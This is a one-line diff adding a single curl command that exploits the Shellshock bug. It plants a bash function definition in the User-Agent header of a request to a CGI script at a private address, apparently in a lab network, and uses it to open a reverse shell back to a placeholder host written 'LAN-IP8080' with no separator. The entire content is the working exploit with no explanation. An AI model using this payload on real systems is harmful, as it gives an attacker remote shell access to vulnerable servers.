@@ -1,0 +1,1 @@
+curl -H "user-agent: () { :; }; /bin/bash -i >& /dev/tcp/LAN-IP8080 0>&1" http://10.11.1.71/cgi-bin/admin.cgi
